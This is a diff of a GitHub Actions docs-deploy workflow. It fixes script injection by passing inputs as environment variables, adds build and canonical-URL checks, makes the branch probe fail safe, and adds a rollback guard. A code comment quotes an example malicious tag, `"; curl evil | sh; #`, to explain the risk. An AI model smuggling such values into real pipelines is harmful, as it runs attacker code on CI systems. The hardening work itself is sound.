@@ -56,6 +56,11 @@ on:
         required: false
         default: "gh-pages"
         type: string
+      allow_rollback:
+        description: "Allow publishing an older patch over a newer one (deliberate rollback)."
+        required: false
+        default: false
+        type: boolean
 
 permissions:
   contents: write
@@ -116,15 +121,30 @@ jobs:
       - name: Plan the deploy
         id: inputs
         shell: bash --noprofile --norc -euo pipefail {0}
+        # Every value here is attacker-influenceable to some degree -- a release
+        # title or tag is chosen by whoever cuts the release, and dispatch inputs
+        # by whoever can run the workflow. Interpolating ${{ }} into `run:`
+        # splices the value into the script *before* bash sees it, so a tag named
+        # `"; curl evil | sh; #` executes. Passing them as environment variables
+        # means bash only ever sees them as data.
+        # https://docs.github.com/en/actions/concepts/security/script-injections
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG: ${{ github.event.release.tag_name }}
+          RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
+          IN_COMPONENT: ${{ github.event.inputs.component }}
+          IN_SOURCE_REF: ${{ github.event.inputs.source_ref }}
+          IN_PUBLISH_AS: ${{ github.event.inputs.publish_as }}
+          IN_DOCS_BRANCH: ${{ github.event.inputs.docs_branch }}
         run: |
           python3 docs/deploy_plan.py \
-            --event "${{ github.event_name }}" \
-            --release-tag "${{ github.event.release.tag_name }}" \
-            --release-prerelease "${{ github.event.release.prerelease }}" \
-            --component "${{ github.event.inputs.component }}" \
-            --source-ref "${{ github.event.inputs.source_ref }}" \
-            --publish-as "${{ github.event.inputs.publish_as }}" \
-            --docs-branch "${{ github.event.inputs.docs_branch }}"
+            --event "${EVENT_NAME}" \
+            --release-tag "${RELEASE_TAG}" \
+            --release-prerelease "${RELEASE_PRERELEASE}" \
+            --component "${IN_COMPONENT}" \
+            --source-ref "${IN_SOURCE_REF}" \
+            --publish-as "${IN_PUBLISH_AS}" \
+            --docs-branch "${IN_DOCS_BRANCH}"
 
       - name: Compute base URL
         id: base_url
@@ -157,11 +177,29 @@ jobs:
       - name: Derive the published version
         id: version
         shell: bash --noprofile --norc -euo pipefail {0}
+        env:
+          COMPONENT: ${{ steps.inputs.outputs.component }}
+          IS_TIP: ${{ steps.inputs.outputs.is_tip }}
+          EXPECT: ${{ steps.inputs.outputs.expect }}
+          # Empty unless the ref really is a tag. Passing it keeps the Python
+          # version from being guessed with `git describe`, which answers "some
+          # reachable tag" rather than "the one being released".
+          PLAN_RELEASE_TAG: ${{ steps.inputs.outputs.release_tag }}
         run: |
-          python3 docs/release_version.py source \
-            --component "${{ steps.inputs.outputs.component }}" \
-            ${{ steps.inputs.outputs.is_tip == 'true' && '--tip' || '' }} \
-            ${{ steps.inputs.outputs.expect != '' && format('--expect {0}', steps.inputs.outputs.expect) || '' }}
+          # Built as an array with plain `if`s rather than `cond && args+=(...)`:
+          # under `set -e` a false condition on the final line would exit the
+          # step, which is a trap worth not leaving lying around.
+          args=(source --component "${COMPONENT}")
+          if [[ "${IS_TIP}" == "true" ]]; then
+            args+=(--tip)
+          fi
+          if [[ -n "${EXPECT}" ]]; then
+            args+=(--expect "${EXPECT}")
+          fi
+          if [[ -n "${PLAN_RELEASE_TAG}" ]]; then
+            args+=(--release-tag "${PLAN_RELEASE_TAG}")
+          fi
+          python3 docs/release_version.py "${args[@]}"
 
       - name: Build C++ docs
         if: ${{ contains(steps.inputs.outputs.components, 'cpp') }}
@@ -174,6 +212,56 @@ jobs:
           # with the directory they will be served from.
           SPHINX_CCCL_VER: ${{ steps.version.outputs.version_dir }}
         run: ./docs/gen_docs.bash --allow-dep-install
+
+      # The C++ build runs the *source ref's own* gen_docs.bash and conf.py, so
+      # a ref that predates the C++/Python split builds the old combined site:
+      # Python pages under /<version>/python/, labelled with a C++ version they
+      # never shipped under, and canonical URLs missing the version segment.
+      # v3.4.2 is exactly such a ref.
+      #
+      # The intended route for those is a backfill branch carrying the two
+      # source edits -- that is how /3.4/ was published. Nothing enforced it,
+      # though, so dispatching the bare tag quietly produced the wrong site.
+      # These assertions make that loud, and they are cheap enough to run on
+      # every build rather than only the ones we suspect.
+      - name: Check the C++ build is separated from Python
+        if: ${{ contains(steps.inputs.outputs.components, 'cpp') }}
+        shell: bash --noprofile --norc -euo pipefail {0}
+        env:
+          VERSION_DIR: ${{ steps.version.outputs.version_dir }}
+          SOURCE_REF: ${{ steps.inputs.outputs.source_ref }}
+        run: |
+          built="source/docs/_build/html/${VERSION_DIR}"
+
+          if [[ -d "${built}/python" ]]; then
+            echo "error: the C++ build produced Python pages at ${VERSION_DIR}/python/." >&2
+            echo "       ${SOURCE_REF} predates the C++/Python split: its docs/conf.py" >&2
+            echo "       does not exclude docs/python and its index.rst still lists" >&2
+            echo "       python/index in the toctree." >&2
+            echo "" >&2
+            echo "       Publish historical releases from a backfill branch that carries" >&2
+            echo "       those two edits, as docs-backfill-3.4 does, rather than from the" >&2
+            echo "       bare tag." >&2
+            exit 1
+          fi
+
+          # The canonical link tells search engines which copy of a page is the
+          # one to index. An older conf.py sets html_baseurl to the site root,
+          # so every version claims the same canonical URL and the archive
+          # competes with itself.
+          index="${built}/index.html"
+          if [[ -f "${index}" ]] && grep -q 'rel="canonical"' "${index}"; then
+            # -m1 rather than `| head -1`: under `set -o pipefail`, head exiting
+            # early sends grep a SIGPIPE and fails the pipeline on a *match*.
+            canonical="$(grep -m1 -o 'rel="canonical" href="[^"]*"' "${index}")"
+            if [[ "${canonical}" != *"/${VERSION_DIR}/"* ]]; then
+              echo "error: canonical URL does not name this version: ${canonical}" >&2
+              echo "       Every version would claim the same canonical URL." >&2
+              echo "       This ref's docs/conf.py predates the versioned html_baseurl." >&2
+              exit 1
+            fi
+            echo "canonical: ${canonical}"
+          fi
 
       - name: Build Python docs
         if: ${{ contains(steps.inputs.outputs.components, 'python') }}
@@ -202,14 +290,41 @@ jobs:
       - name: Check whether the docs branch exists
         id: pages
         shell: bash --noprofile --norc -euo pipefail {0}
+        env:
+          DOCS_BRANCH: ${{ steps.inputs.outputs.docs_branch }}
         run: |
-          if git ls-remote --exit-code --heads origin \
-               "refs/heads/${{ steps.inputs.outputs.docs_branch }}" >/dev/null 2>&1; then
-            echo "exists=true" >> "${GITHUB_OUTPUT}"
-          else
-            echo "exists=false" >> "${GITHUB_OUTPUT}"
-            echo "::notice::${{ steps.inputs.outputs.docs_branch }} does not exist yet; this deploy creates it"
-          fi
+          # This probe decides whether the archive is seeded, and the publish
+          # below runs with keep_files: false. So "I could not tell" must never
+          # collapse into "there is nothing there" -- that reading would delete
+          # every published version.
+          #
+          # `git ls-remote --exit-code` exits 2, and only 2, for "no matching
+          # ref". Transport, authentication, DNS and server errors surface as
+          # other non-zero codes (128 in practice). The previous `if` treated
+          # all of them alike and discarded the message with 2>&1 to /dev/null.
+          set +e
+          probe="$(git ls-remote --exit-code --heads origin "refs/heads/${DOCS_BRANCH}" 2>&1)"
+          status=$?
+          set -e
+
+          case "${status}" in
+            0)
+              echo "exists=true" >> "${GITHUB_OUTPUT}"
+              ;;
+            2)
+              echo "exists=false" >> "${GITHUB_OUTPUT}"
+              echo "::notice::${DOCS_BRANCH} does not exist yet; this deploy creates it"
+              ;;
+            *)
+              echo "error: could not determine whether ${DOCS_BRANCH} exists." >&2
+              echo "       git ls-remote exited ${status} (2 would mean 'no such branch'):" >&2
+              printf '%s\n' "${probe}" | sed 's/^/       /' >&2
+              echo "" >&2
+              echo "       Refusing to continue. Publishing without a seed would treat" >&2
+              echo "       the site as empty and delete every archived version." >&2
+              exit 1
+              ;;
+          esac
 
       # Deliberately no continue-on-error: if the branch exists and this fails,
       # the job must fail.
@@ -229,6 +344,9 @@ jobs:
           VERSION_DIR: ${{ steps.version.outputs.version_dir }}
           RELEASE_LABEL: ${{ steps.version.outputs.release_label }}
           PAGES_EXISTS: ${{ steps.pages.outputs.exists }}
+          # Non-empty only when a human deliberately asked to roll a version
+          # directory back to an older patch.
+          ALLOW_ROLLBACK: ${{ github.event.inputs.allow_rollback == 'true' && '1' || '' }}
         run: |
           # The tree that becomes gh-pages:/docs. Seeded from what is live, so
           # it is the complete desired state and can be published cleanly.
@@ -265,6 +383,21 @@ jobs:
               echo "error: no build output at ${build}/${VERSION_DIR}" >&2
               exit 1
             fi
+
+            # A version directory holds the newest patch in its line, and
+            # nothing about scheduling guarantees that. GitHub does not promise
+            # execution order within a concurrency group, and re-running an old
+            # release deploy is ordinary maintenance -- so check the label that
+            # is already there before overwriting it.
+            existing_label=""
+            if [[ -f "${component_root}/${VERSION_DIR}/.release" ]]; then
+              existing_label="$(tr -d '\n' < "${component_root}/${VERSION_DIR}/.release")"
+            fi
+            python3 "${GITHUB_WORKSPACE}/docs/release_version.py" precedence \
+              --existing "${existing_label}" \
+              --incoming "${RELEASE_LABEL}" \
+              --directory "${component}/${VERSION_DIR}" \
+              ${ALLOW_ROLLBACK:+--allow-rollback}
 
             # Replace this one version wholesale. Everything else is carried
             # over by the seed, so the publish below deletes exactly the files
